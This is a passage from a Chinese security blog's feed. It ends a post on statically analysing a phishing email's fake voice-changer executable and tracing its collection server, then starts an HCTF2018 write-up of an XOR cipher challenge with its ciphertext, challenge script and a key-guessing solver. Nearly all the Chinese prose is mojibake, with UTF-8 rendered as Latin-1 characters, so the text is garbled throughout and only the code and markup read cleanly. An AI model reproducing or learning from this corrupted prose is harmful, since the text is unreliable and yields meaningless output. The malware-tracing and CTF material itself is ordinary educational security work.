çš„è¯ğŸ˜„ï¼‰ï¼Œæˆ–æ˜¯è®¾å¤‡è¢«æ¤å…¥æœ¨é©¬ï¼Œè®°å½•é”®ç›˜è¾“å…¥ï¼ŒæŠ‘æˆ–æ˜¯ä¼ªé€ é¡µé¢ä½¿å¾—ç”¨æˆ·ä¸»åŠ¨è¾“å…¥è´¦å·å¯†ç ç­‰ç­‰ç­‰ç­‰ã€‚</p><p>æ—¢ç„¶çŸ¥é“ï¼Œè´¦å·å¯†ç æ˜¯ä»è‡ªå·±çš„è®¾å¤‡ä¸Šä¼ åˆ°æ¶æ„ç›—å·è€…æ‰‹ä¸Šçš„ï¼Œé‚£ä¹ˆé—®é¢˜å°±å˜å¾—ç®€å•äº†ã€‚</p><p>æ¥ä¸‹æ¥å°±ä»ä¸€ä¸ªé‚®ä»¶é’“é±¼è¯´èµ·ï¼Œäº‹æƒ…æ˜¯è¿™æ ·å­çš„â€¦â€¦</p></blockquote><h2 id="0x00-æ”¶åˆ°ä¸€å°å¯çˆ±çš„é‚®ä»¶"><a href="#0x00-æ”¶åˆ°ä¸€å°å¯çˆ±çš„é‚®ä»¶" class="headerlink" title="0x00 æ”¶åˆ°ä¸€å°å¯çˆ±çš„é‚®ä»¶"></a>0x00 æ”¶åˆ°ä¸€å°å¯çˆ±çš„é‚®ä»¶</h2><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120225806.png" alt=""></p><blockquote><p>é‚®ä»¶ä¸­æœ‰å¯çˆ±çš„èŒå¦¹å˜å£°å™¨ï¼Œæœ‰ç¦åˆ©å°ç”µå½±ï¼Œæ¸¸æˆåŠ é€Ÿå™¨çš„é“¾æ¥ï¼Œå¯è°“æ˜¯å¸å¼•äººæäº†ï¼Œæˆ‘ä»¬å…ˆå»è¿™ä¸ªé“¾æ¥ä¸‹è½½ä¸€ä¸ªèŒå¦¹å˜å£°å™¨ç©ä¸€ä¸‹ã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªååˆ†å…¸å‹çš„exeæ–‡ä»¶ï¼Œä¸€èˆ¬ç¨å¾®æœ‰äº›åŸºç¡€ç´ å…»çš„äººéƒ½ä¸ä¼šéšä¾¿ç‚¹å¼€è¿™ç§exeæ–‡ä»¶çš„å“¦ã€‚æ¯”exeæ–‡ä»¶æ›´å®¹æ˜“ä¸­æ‹›çš„æ˜¯æ–‡æ¡£æ–‡ä»¶ï¼Œå¦‚docæ–‡æ¡£ï¼Œæ¶æ„äººå‘˜å¯èƒ½ä¼šåˆ©ç”¨å¦‚officeçš„æ¼æ´ï¼Œå½“ä½ ç‚¹å¼€ä»–ç²¾å¿ƒåˆ¶ä½œçš„æ–‡æ¡£çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘å¦‚å®ç—…æ¯’ï¼Œè¿œç¨‹ä»£ç æ‰§è¡Œç­‰é—®é¢˜ï¼Œæ­£ä¸­äººä¸‹æ€€ã€‚</p></blockquote><p>è™šæ‹Ÿæœºæ˜¯ä¸ªå¥½ä¸œè¥¿å‘¢ï¼Œå¦‚æœä½ æœ‰ä»€ä¹ˆä¸œè¥¿éè¦å†’ç€é£é™©å»è¿è¡Œä¸€ä¸‹ï¼Œé‚£ä¹ˆä¸å¦‚è£…ä¸ªè™šæ‹Ÿæœºå…ˆè¯•è¯•æ°´ï¼Œè¿™æ¬¡åˆ†ææˆ‘ä»¬å°±åœ¨ä¸€ä¸ªwin7çš„è™šæ‹Ÿæœºä¸­è¿›è¡Œã€‚</p><h2 id="0x01-ä½¿ç”¨å·¥å…·ï¼ˆIDA-Proï¼‰-è¿›è¡Œç®€å•çš„é™æ€åˆ†æ"><a href="#0x01-ä½¿ç”¨å·¥å…·ï¼ˆIDA-Proï¼‰-è¿›è¡Œç®€å•çš„é™æ€åˆ†æ" class="headerlink" title="0x01 ä½¿ç”¨å·¥å…·ï¼ˆIDA Proï¼‰ è¿›è¡Œç®€å•çš„é™æ€åˆ†æ"></a>0x01 ä½¿ç”¨å·¥å…·ï¼ˆIDA Proï¼‰ è¿›è¡Œç®€å•çš„é™æ€åˆ†æ</h2><p>å…¶å®éƒ½æ²¡æ€ä¹ˆåˆ†æç¨‹åºé€»è¾‘ï¼Œå› ä¸ºã€‚ã€‚ã€‚è¿™ç¨‹åºå¤ªç²—ç³™äº†ã€‚</p><p>ä¸‹è½½èŒå¦¹å˜å£°å™¨.exeåï¼Œå¯ä»¥å…ˆçœ‹çœ‹æ–‡ä»¶å±æ€§å“¦ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120230944.png" alt=""></p><p>æ–‡ä»¶å¤§å°ä»…æœ‰707kbï¼Œä¸€ä¸ªå˜å£°å™¨ä½ è§‰å¾—åªéœ€è¦707kbå¤§å°å—ï¼Ÿå¾ˆæ˜æ˜¾ä¸æ­¢çš„å¥½ä¸å¥½ï¼Œæ¯•ç«Ÿå˜å£°å™¨è¿™ä¹ˆç§€çš„ç©æ„å„¿æ˜¯å§ã€‚</p><p>å…ˆç”¨PC hunterç›‘æ§ä¸€ä¸‹è¿è¡Œè¯¥æ–‡ä»¶ä¹‹å‰ï¼Œæˆ‘ä»¬çš„ç½‘ç»œæƒ…å†µï¼ˆè¿›ç¨‹ï¼ŒæœåŠ¡ç­‰ä¿¡æ¯ï¼‰ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120231308.png" alt=""></p><p>åŒå‡»è¿è¡Œä¸€ä¸‹<code>èŒå¦¹å˜å£°å™¨.exe</code>ï¼Œemmmäº‹å®æ˜¯å› ä¸ºè™šæ‹Ÿæœºä¸­ç¼ºå°‘ä¸€äº›æ–‡ä»¶å¯¼è‡´æ— æ³•è¿è¡Œï¼Œæ­£å¸¸æƒ…å†µä¸‹è¿è¡Œä¹‹ååŸºæœ¬ä¸Šæ˜¯å¯ä»¥çœ‹åˆ°ä¼šæœ‰å¤šå‡ºæ¥çš„å¼‚å¸¸è¿›ç¨‹ï¼Œè€Œè¿™ä¸ªè¿›ç¨‹ä¼šå¯¹æŸä¸ªipæˆ–è€…åŸŸåè¿›è¡Œè¿æ¥ï¼Œä¼ è¾“çªƒå–çš„ä¿¡æ¯ç­‰ç­‰ã€‚</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥ç›´æ¥åˆ†æå§ï¼ŒIDA Proåæ±‡ç¼–ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120232154.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡åæ±‡ç¼–ä¹‹åï¼Œç¨‹åºå†…éƒ¨çš„ä¸€äº›ä¿¡æ¯ä»¥æ±‡ç¼–ä»£ç çš„å½¢å¼å±•å¼€ï¼Œä½†æ˜¯æˆ‘ä»¬æ—¢ç„¶æ˜¯ä»¥ç™½è¯æ–‡çš„å½¢å¼æ¥è®²è¿™ç¯‡ç§‘æ™®æ–‡ç« ï¼Œé‚£è‚¯å®šä¸æ˜¯åˆ†æä»£ç å’¯ï¼Œåªè¦æ˜ç™½è¿™ä¸ªæµç¨‹å°±è¡Œå•¦ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨IDA proçš„<code>shift + f12</code>å¿«æ·é”®æ¥æå–è¿™ä¸ª<code>èŒå¦¹å˜å£°å™¨.exe</code>ä¸­çš„ä¸€äº›å­—ç¬¦ä¸²ï¼Œæ¥çœ‹çœ‹æœ‰æ²¡æœ‰å¯ç–‘çš„æ˜æ˜¾çš„çº¿ç´¢ã€‚</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120232604.png" alt=""></p><p>å¾ˆç®€å•å°±çœ‹åˆ°äº†ä¸€äº›å…³é”®å­—çœ¼ï¼Œå¦‚<code>Connection==&gt;è¿æ¥||Pipe==&gt;ç®¡é“||Hostname==&gt;ä¸»æœºå</code>ç­‰ä¿¡æ¯ã€‚å½“ç„¶ï¼Œæ›´é«˜çº§ä¸€ç‚¹çš„è½¯ä»¶æˆ–è€…é’“é±¼ç¨‹åºä¸ä¼šåƒè¿™ä¸ªè¿™ä¹ˆç²—ç³™ï¼Œè‡³å°‘ä¼šç»™å…³é”®å­—ç¬¦ä¸²åŠ å¯†ï¼ŒåŠ å£³æˆ–è€…åŠ åè°ƒè¯•æªæ–½ï¼Œè¿™éƒ½æ˜¯åè¯äº†ï¼ˆä¼°è®¡å°ç™½å¬ä¸æ‡‚ï¼‰ã€‚</p><p>é‚£ä¹ˆå†ç»†ç»†æ‰¾æ‰¾ï¼Œèƒ½ä¸èƒ½æ‰¾åˆ°è¯¥é’“é±¼ç¨‹åºæ•£å¸ƒè€…çš„è¸ªè¿¹å‘¢ï¼Ÿ</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233000.png" class="lazyload"></p><p>æœä¸å…¶ç„¶ï¼ŒIPåœ°å€æ‹¿åˆ°äº†ï¼Œå»çœ‹ä¸€çœ¼å–ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233142.png" class="lazyload"></p><h2 id="0x02-ç®€å•åœ°è¿½è¸ªæº¯æº"><a href="#0x02-ç®€å•åœ°è¿½è¸ªæº¯æº" class="headerlink" title="0x02 ç®€å•åœ°è¿½è¸ªæº¯æº"></a>0x02 ç®€å•åœ°è¿½è¸ªæº¯æº</h2><p>ä¸Šé¢çš„é‚£ä¸ªurlæ˜¯ä¸€ä¸ªç”¨æ¥æ¥æ”¶çªƒå–åˆ°çš„ä¿¡æ¯çš„æ¥å£ï¼Œé‚£ä¹ˆé€šè¿‡ç°æœ‰çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¦‚ä½•æ·±ä¸€æ­¥è¿½è¸ªæº¯æºåˆ°è¿™ä½å¯çˆ±çš„ç¨‹åºæ•£å¸ƒè€…å‘¢ï¼Ÿ</p><p>å½“ç„¶æ˜¯å¨èƒæƒ…æŠ¥åˆ†æå¹³å°èµ°ä¸€æ³¢å’¯ï¼ˆå¦‚VTï¼Œå¾®æ­¥ï¼‰ï¼Œå…¶å®æˆ‘ä»¬ä¸€å¼€å§‹å°±å¯ä»¥æŠŠè¯¥exeæ–‡ä»¶ä¸Šä¼ åˆ°å¨èƒæ£€æµ‹å¹³å°è¿›è¡Œæ£€æµ‹ï¼ˆå¹³å°å¯ä»¥å¯¹URLï¼ŒMD5ï¼ŒIPç­‰ç­‰ä¿¡æ¯è¿›è¡Œå…³è”æŸ¥è¯¢ï¼‰ï¼Œä½†æ˜¯ä¸ºäº†æƒ…èŠ‚éœ€è¦ï¼Œå…ˆç»†ç»†åˆ†æä¸€ä¸‹æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨è¦åšçš„æ˜¯ç”¨å¨èƒæƒ…æŠ¥å¹³å°æŸ¥æ‰¾å¾—åˆ°çš„IPå…³è”ä¿¡æ¯ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233709.png" class="lazyload"></p><p>å®é™…ä¸Šç”¨æœ€å¼€å§‹é‚®ç®±ä¸­æ”¶åˆ°çš„é‚£ä¸ªåŸŸåä¹Ÿä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹å…³è”çš„æ–‡ä»¶æ£€æµ‹ä¿¡æ¯ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120233930.png" class="lazyload"></p><p>å¯ä»¥çœ‹åˆ°æ£€æµ‹åˆ°äº†å¨èƒï¼Œå…·æœ‰ä¸€å®šçš„å±é™©æ€§ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234058.png" class="lazyload"></p><p>å…¶å®æ¥ä¸‹æ¥å°±å¯ä»¥å¯¹è¯¥IPè¿›è¡Œæ›´æ·±å…¥çš„äº†è§£äº†ï¼ˆæ”»å‡»æ˜¯ä¸å¯èƒ½æ”»å‡»çš„ï¼Œé¡¶å¤šæ‰«ææ‰«æç›®å½•ï¼Œæ‰«æç›®å½•æˆ‘ä¹Ÿæ˜¯æ²¡æœ‰æ‰«çš„ï¼‰å› ä¸ºä¸‹é¢å¾—åˆ°çš„å‡ ä¸ªurlå°±å¤Ÿæˆ‘ä»¬æ‰¾åˆ°é‚£ä¸ªå¯çˆ±çš„äººäº†ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234312.png" class="lazyload"></p><p>è®¿é—®ä¸€ä¸‹è¿™äº›urlï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181120234500.png" class="lazyload"></p><p>å—¯å·®ä¸å¤šå°±å¾—äº†ï¼Œæˆ‘ä»¬ä¹Ÿå°±ä¸æ‰“æ‰°äººå®¶äº†å§ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><blockquote><p>æ€»ä¹‹å°±æ˜¯ï¼Œæ¶æ„é“¾æ¥å°‘ç‚¹å»ç‚¹å¼€å•¦ï¼Œå°±ç®—ç‚¹å¼€äº†ï¼Œæ²¡æœ‰èµ‹äºˆæƒé™ï¼Œæˆ–è€…ä½ æ²¡æœ‰ä¸»åŠ¨è¾“å…¥è´¦å·å¯†ç ï¼Œå†æˆ–è€…æ˜¯ä½ æ²¡æœ‰ç½‘ç»œï¼Œéƒ½åŸºæœ¬ä¸ä¼šå¯¼è‡´è¢«ç›—å·çš„å•¦ã€‚</p><p>æ¶æ„æ–‡ä»¶è‡ªå·±éœ€è¦å¥½å¥½åˆ†è¾¨å’¯ï¼Œå°±ä»ä¸Šé¢çš„æ–¹æ³•æˆ‘ä»¬åŸºæœ¬ä¸Šå°±å¯ä»¥é¿å…æ¶æ„æ–‡ä»¶äº†ï¼Œä½†æ˜¯æ¶æ„æ–‡æ¡£è¿˜æ˜¯éœ€è¦æ³¨æ„ï¼Œè™½ç„¶æ¶æ„æ–‡æ¡£çš„é’ˆå¯¹æ€§ï¼Œä¼ªé€ éš¾åº¦æ¯”è¾ƒé«˜ï¼Œä½†æ˜¯ä¸æ’é™¤æŸå¤©ä½ å°±è¢«é’ˆå¯¹äº†ï¼Œä½ è¯´æ˜¯å§ï¼ŸğŸ¤£</p></blockquote><p>è‹¥æœ‰ä¸ç¬¦ï¼Œè¿˜æœ›æ–§æ­£ã€‚</p><p>Published by Yof3ng.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;â€¦â€¦&lt;/p&gt;
    
    </summary>
    
      <category term="ä¿¡æ¯å®‰å…¨" scheme="http://www.yof3ng.xyz/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="è¿½è¸ªæº¯æº" scheme="http://www.yof3ng.xyz/tags/%E8%BF%BD%E8%B8%AA%E6%BA%AF%E6%BA%90/"/>
    
      <category term="ä¿¡æ¯å®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HCTF2018_å­¦ä¹ è®°å½•</title>
    <link href="http://www.yof3ng.xyz/2018/11/13/HCTF2018-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://www.yof3ng.xyz/2018/11/13/HCTF2018-å­¦ä¹ è®°å½•/</id>
    <published>2018-11-13T07:34:00.000Z</published>
    <updated>2019-04-02T08:45:31.596Z</updated>
    
    <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="HCTF2018-å­¦ä¹ è®°å½•"><a href="#HCTF2018-å­¦ä¹ è®°å½•" class="headerlink" title="HCTF2018_å­¦ä¹ è®°å½•"></a>HCTF2018_å­¦ä¹ è®°å½•</h1><blockquote><p>é‡æ•´æ——é¼“å†ä¸Šè·¯ğŸ˜­ï¼Œhctfæ²¡å¤ªé‡è§†(å…¶å®é‡è§†äº†ä¹Ÿä¸ä¼šåš)ï¼Œåªèƒ½èµ›åçœ‹çœ‹å¸ˆå‚…ä»¬çš„writeupå­¦ä¹ ä¸€æ³¢ã€‚æ¥ä¸‹æ¥æ‰“ç®—å­¦ä¸€ä¸‹åŸºç¡€çš„å¯†ç å­¦ï¼Œä¸ç„¶è€æ˜¯æ‡µé€¼å¯æ²¡ç”¨å‘¢ã€‚</p></blockquote><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://xz.aliyun.com/t/3257#toc-17" target="_blank" rel="noopener">HCTF2018_CNSS_WP</a></p><p><a href="https://xz.aliyun.com/t/3256#toc-21" target="_blank" rel="noopener">HCTF2018_ å¤©æ¢ _WP</a></p><p><a href="https://xz.aliyun.com/t/3253#toc-23" target="_blank" rel="noopener">HCTF2018_Eur3kA_WP</a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="crypto1-Xor-game"><a href="#crypto1-Xor-game" class="headerlink" title="crypto1 - Xor_game"></a>crypto1 - Xor_game</h3><blockquote><p>é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªcipher.txtè£…æœ‰å¯†æ–‡ï¼Œä»¥åŠä¸€ä¸ªåŠ å¯†è„šæœ¬ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><p>cipher.txt:</p><pre class=" language-python"><code class="language-python">ciMbOQxffx0GHQtSBB0QSQIORihXVQAUOUkHNgQLVAQcAVMAAAMCASFEGQYcVS8BNh8BGAoHFlMAABwCTSVQC2UdMQx5FkkGEQQAAVMAAQtHRCNLF0NSORscMkkaHABSExIYBQseUmBCFgtSKwEWfwELFRcGbzwEDABHVS8DDAcXfwUcMQwCDUUBCgYYSQEBATNKGwQeOkkbPhsYERYGDB0TYzwCUSVCDE8dKh0BNg4GAAkLSVMWHBpHQCxQF08AOhkWPh1OAA0XRQQRBQJKQyVKFghSMA95Gh8LGhEHBB8YEE4UViFaEQEVfwAdfx0GEUUWAAARGxpHTiFQERx4FkkROgUHERMXRTpUCANtYy9RFk8TLEkHNwxOFhcbAhsASR0STC1GCk8UMwYEOhsdfiEdRR0bHU4QSDRLHR0XO0kGMQ0LEgATERYQSQgORDJaWAsXMgYdfxsbGAB4LRYVGxpHUyFXHU8TMQ1TPRsLFREaDB0TSRoIASJGGR1SKwEWfwUBFQFSChVUHQYCASNWFQ0XLRocMgxkNgoAABd<span class="token operator">+</span>PRkIKwkDEAoTLQ1TKwELVAgHFhoXRU4BUy9OWBsaOkkeMAYAVAQcAVMXCBwEQDNQci4HJwAfNggcDUUXHQcGDAMCASFGCxsaOh0aPAAdGUUQBBoASRoIASNCCBsHLQxTMgAdABx4IxoYBQcJRmBXEApSNgcHOgcdEUUeDBURRU4FVDQDGQMBMEkVNgUCHQsVRQccDE4XVDJGcjsaOhsWfwgcEUUTCQQVEB1HTCVOFx0bOhpTKwEcGxAVDRwBHU4TSSUDHQ4AKwF5FkkMEQkbAAURSSdHQC0pPAYXO0kSLEkaHABSFAYdDBpHQyVCDRsLfwYVfwgbABAfC1MYDA8RRDMpKwcXMQ5TNhpOGgoGRRAcCAEUDWBQFQAZOkkUOhoaARcXbzYCDABHVilPDE8TMxocfxsLAAQbCxYQSQwITyUDCB0dKg0fJkk<span class="token operator">/</span>HQsVRTURBwlHTDVQGwMXVSYQPBwCAG8mDQERDGQuAShGGR1SMwYFOkVOPUUQAB8dDBgCASlNWAMdKQx5EwYYEUUbFlMVSR4ITiwDFwlSLB0BKg4JGAwcAlMWBRsCDCdRHQocfwgfOAgLfiQBRRcRGgELQDRGWAIbPBsccgsbBhYGRRwSSRkOTyQpOgMXOg0aMQ5OAA0ACgYTAU4KWGBVHQYcLGMqOggcB0UBERIAAAEJRCQDEQFSKwEWfwsLGAwXA3kyBhsVKwkDGgoeNgwFOkkaHAQGRRIYBU4EQC4DEAoTLWM2KQwAVAQcERoXAB4GVSUDHAYBPBsWKwxCVCxSCBYASRoPRGBMDAcXLUkHNwwHBkUdEh1<span class="token operator">+</span>OgEKRGBAGQFSMQYHfw4cFRYCRQccDE4KTi1GFht4EwwVK0kaG0UGDRZULA8UVWBXF08VMEkkOhoaWEUGDRZUDQsGRWBODRwGfwccK0kcEREHFx1UHQFHTy9UEAoAOmMgOgxCVCxSEhYVG049QC4DPgMdKAwBLEkBGkUfHFMcDA8DDWBKFk8UKgUffwsCGwofRRIYBgAAATRLHU8FPhBTPgUCVBEaAFMDCBdtZzJGCRoXMR0fJkkDHRYBABdUGgEKRGwDGhoGfwgfLAZOEAAXFR8NSQMIVyVHWA0Lfx4aMQ1CVAMACgAARU4UTy9UWAAAfxsSNgdkMgwEAHkkGw8NTyEDKA4APgQaKwhCVBYdCh1UCB1HUi9MFk8TLGMfNg8LVAcXRRERCBsTSCZWFE8eNgIWfxobGQgXF1MSBQEQRDJQWA4cO0kXOggaHEUeDBgRSQ8SVTVOFk8eOggFOhpkNQkBClMXCBwCASFBFxoGfx4bPh1OHAQB</code></pre><p>challenge.py:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#challenge.py</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>strxor <span class="token keyword">import</span> strxor<span class="token keyword">import</span> base64<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">enc</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token punctuation">(</span>key <span class="token operator">*</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">/</span> len<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> strxor<span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span>poem <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'poem.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">"hctf{xxxxxxxxxxx}"</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'cipher.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>enc<span class="token punctuation">(</span>poem<span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; é€šè¿‡ç®€å•åˆ†æå…¶é€»è¾‘ï¼Œå¯ä»¥çŸ¥é“xor_keyå°±æ˜¯flagèŠ±æ‹¬å·ä¸­çš„å†…å®¹ï¼Œé€šè¿‡è¯¥xor_keyå¯¹poem.txtä¸­çš„å†…å®¹è¿›è¡ŒåŠ å¯†ï¼Œå¹¶ä¸”éœ€è¦å¯¹åº”é•¿åº¦ã€‚å› ä¸ºpoem.txtä¸­æ˜¯ä¸€é¦–è¯—ï¼Œè¯—ä¸­å¯èƒ½ä¼šå‡ºç°å­—æ¯ï¼Œæ•°å­—ï¼Œå¼•å·ï¼Œæ¢è¡Œç­‰ç­‰åˆæ³•å­—ç¬¦ï¼Œç”±äºæˆ‘ä»¬åªæœ‰å¯†æ–‡ï¼Œå¹¶ä¸”çŸ¥é“xorçš„è§„å¾‹ï¼Œæ˜¯xor_keyçš„é•¿åº¦æ¥å†³å®šçš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡éå†åŠ ä¸Šç®€å•çš„åˆ¤æ–­ï¼Œå†™å‡ºå¦‚ä¸‹ä»£ç (è¿™æ˜¯æœ€ç®€å•çš„è§£æ³•ï¼Œå‚ç…§<a href="https://xz.aliyun.com/t/3257#toc-17" target="_blank" rel="noopener">ç”µå­ç§‘å¤§CNSSæˆ˜é˜Ÿçš„wp</a> ï¼‰ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#exp.py</span><span class="token keyword">import</span> base64<span class="token comment" spellcheck="true">#æ£€æµ‹æ˜¯å¦ä¸ºè¯—æ­Œæ­£å¸¸å­—ç¬¦</span><span class="token keyword">def</span> <span class="token function">invalid</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> chr<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token string">'{}[]@#%^*=+'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token comment" spellcheck="true">#æ¢è¡Œç¬¦ä¸ºæ­£å¸¸å­—ç¬¦</span>    <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> x <span class="token operator">&lt;=</span> <span class="token number">31</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span>cipher <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token string">'cipher.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># å¯èƒ½çš„xor_keyé•¿åº¦</span><span class="token keyword">for</span> L <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    cc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#å¯¹xor_keyçš„æ¯ä¸€ä½è¿›è¡Œæšä¸¾</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> cand <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token comment" spellcheck="true">#æ­¥é•¿ä¸ºxor_keyé•¿åº¦ï¼Œè¿›è¡Œæµ‹è¯•</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>i<span class="token punctuation">,</span> len<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> L<span class="token punctuation">)</span><span class="token punctuation">:</span>                tmp <span class="token operator">=</span> cand <span class="token operator">^</span> cipher<span class="token punctuation">[</span>j<span class="token punctuation">]</span>                <span class="token comment" spellcheck="true">#è‹¥ä¸ä¸ºæ­£å¸¸å­—ç¬¦ï¼Œåˆ™å°†flagæ ‡å¿—ä½ç½®ä¸ºFalse,ä¸ä¼šå°†è¯¥asciiä½œä¸ºå¯èƒ½çš„xor_keyå­—ç¬¦</span>                <span class="token keyword">if</span> invalid<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token boolean">False</span>                    <span class="token keyword">break</span>            <span class="token comment" spellcheck="true">#å°†ç¬¦åˆæ¡ä»¶çš„asciiå¯¹åº”çš„å­—ç¬¦æ·»åŠ åˆ°å¯¹åº”xor_keyå­—ç¬¦ä½ç½®çš„åˆ—è¡¨</span>            <span class="token keyword">if</span> flag<span class="token punctuation">:</span>                t<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>cand<span class="token punctuation">)</span><span class="token punctuation">)</span>        c<span class="token punctuation">.</span>append<span class="token punctuation">(</span>len<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span>        cc<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token number">0</span> <span class="token operator">not</span> <span class="token keyword">in</span> c<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span> c<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> cc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img 